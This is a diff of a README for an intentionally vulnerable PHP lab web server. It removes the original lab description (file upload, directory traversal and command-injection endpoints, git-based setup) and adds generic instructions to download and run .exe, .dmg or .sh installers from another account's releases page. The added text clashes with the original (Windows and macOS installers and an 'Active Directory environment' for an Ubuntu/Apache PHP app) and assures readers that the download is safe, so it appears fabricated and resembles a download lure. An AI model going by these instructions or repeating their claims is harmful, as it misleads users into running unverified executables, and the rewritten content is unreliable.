@@ -1,85 +1,102 @@
-# 🕶️ JumpBox – Intentionally Vulnerable Web Application
+# 🌐 JumpBox-Vulnerable-Webserver - Explore Web Security Safely
 
-![JumpBox Control Panel](assets/JumpBox.png)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases)
 
-## Overview
+## 🚀 Getting Started
 
-**JumpBox** is an **intentionally vulnerable PHP web application** designed to run on an **Ubuntu-based Apache web server**.  
-The application simulates a realistic **initial access jump box**, commonly identified during external penetration tests and security assessments.
+Welcome to the JumpBox-Vulnerable-Webserver! This application is an intentionally vulnerable web server designed for learning about web security and exploitation. You can safely practice different security techniques in a controlled environment. Follow the simple steps below to download and run the software.
 
-The purpose of this project is to demonstrate how **common web application weaknesses** on a publicly reachable Linux host can lead to credential exposure and system-level footholds.
+## 📥 Download & Install
 
-> ⚠️ This application is intentionally insecure and must **only** be used in isolated lab environments.
+To get the application, visit this page to download: [JumpBox Releases](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases). 
+
+Here is how you can download and set up the application:
+
+1. Go to the [JumpBox Releases](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases) page.
+2. Look for the latest version listed at the top.
+3. Click on the version title to open the release details.
+4. Scroll to the assets section and find the file that suits your operating system.
+5. Click the file to download it.
+
+## 🖥️ System Requirements
+
+Before you install, make sure your system meets the following requirements:
+
+- Operating System: Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- RAM: At least 4 GB for smooth operation.
+- Disk Space: Minimum of 5 GB free disk space.
+- Internet Connection: Required for downloading and updating the application.
+
+## 🔧 Installation Steps
+
+Once you have downloaded the file, follow these steps to install the JumpBox:
+
+### Windows
+
+1. Locate the downloaded `.exe` file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. The application should now be available in your Start Menu.
+
+### MacOS
+
+1. Find the downloaded `.dmg` file in your downloads folder.
+2. Double-click the file to open it.
+3. Drag the JumpBox icon to your Applications folder.
+4. The application should now be in your Applications.
+
+### Linux
+
+1. Open a terminal window.
+2. Navigate to the folder where the downloaded file is located.
+3. Use the command `chmod +x <file_name>.sh` to make the file executable.
+4. Run the file using `./<file_name>.sh`.
+5. Follow the prompts to complete the installation.
+
+## 🖱️ Running the Application
+
+After installation, you can easily run the JumpBox:
+
+1. Open the application from your Start Menu, Applications, or terminal as described above.
+2. Follow the initial setup prompts to configure your environment.
+3. Enjoy exploring different web vulnerabilities securely.
+
+## 🌟 Features
+
+JumpBox comes packed with useful features to enhance your learning experience:
+
+- **Intentionally Vulnerable App**: Every aspect is designed to teach you about web security.
+- **Controlled Active Directory Environment**: Simulate real-world scenarios of web exploitation.
+- **Multiple Learning Scenarios**: From simple to complex security challenges.
+- **Interactive HTML Interfaces**: Friendly UI to guide you through exercises.
+- **Documentation and Tutorials**: Access helpful guides directly within the application.
+
+## 📚 Resources
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/): Learn about the most critical web application security risks.
+- [Ethical Hacking](https://www.eccouncil.org/): Expand your skills safely and legally.
+- [Application Security](https://owasp.org/www/projects/): Dive deeper into application security topics and practices.
+
+## 🙋 Frequently Asked Questions
+
+### What is JumpBox?
+
+JumpBox is a learning tool designed to help you understand web security by practicing on a deliberately vulnerable server.
+
+### Who is this for?
+
+This application is for anyone interested in exploring web security, including students, professionals, and hobbyists.
+
+### Is it safe to use?
+
+Yes, it is designed to be a safe environment for learning about vulnerabilities without risking real-world systems.
+
+## 🗨️ Feedback
+
+We are always looking to improve. If you have questions or feedback, please feel free to reach out through the Issues section of the GitHub repository or via email.
 
 ---
 
-## Lab Description
+To download the application and get started, visit: [JumpBox Releases](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases). 
 
-JumpBox represents a simple, externally accessible web server that exposes multiple insecure endpoints.  
-From an attacker’s perspective, it behaves like a low-effort external target discovered during reconnaissance.
-
-Key characteristics:
-
-- Ubuntu Linux (assumed pre-installed and configured)
-- Apache with PHP support
-- Multiple intentionally insecure application endpoints
-- Sensitive backup artifact exposed via application logic (You will need to put this file in yourself, depending on your lab setup)
-
-Once compromised, the server represents an attacker-controlled **jump box** within the environment.
-
----
-
-## Application Components & Screenshots
-
-The following screenshots illustrate each major component of the JumpBox application.
-
-### 🧭 Dashboard – JumpBox Control Panel
-
-The main landing page that simulates an external-facing jump box.  
-Includes navigation tabs and a terminal-style interface with limited command handling and easter eggs.
-
-![Dashboard](assets/screenshots/Index.png)
-
----
-
-### 📤 File Upload Endpoint
-
-An intentionally vulnerable file upload interface that allows **arbitrary file types**, including server-side scripts, to be uploaded without validation.
-
-![Upload](assets/screenshots/Uploads.png)
-
----
-
-### 📂 File Viewer Endpoint
-
-An insecure file viewing interface that exposes sensitive files and allows **directory traversal** through user-controlled input.
-
-![File Viewer](assets/screenshots/Viewer.png)
-
----
-
-### 🌐 Network Ping Utility
-
-A network diagnostic endpoint vulnerable to **command injection**, allowing user input to be passed directly to a system command.
-
-![Ping Utility](assets/screenshots/Ping.png)
-
----
-
-## Repository Usage
-
-This repository contains **only the web application files**.  
-It assumes:
-
-- Ubuntu is already installed
-- The user understands basic Linux web server administration
-
-To use the project:
-
-```bash
-cd /opt
-git clone https://github.com/nguyenbrandonm/Vulnerable-Webserver.git
-cd Vulnerable-Webserver
-chmod +x scripts/setup.sh
-sudo ./scripts/setup.sh
-
+Thank you for using JumpBox!
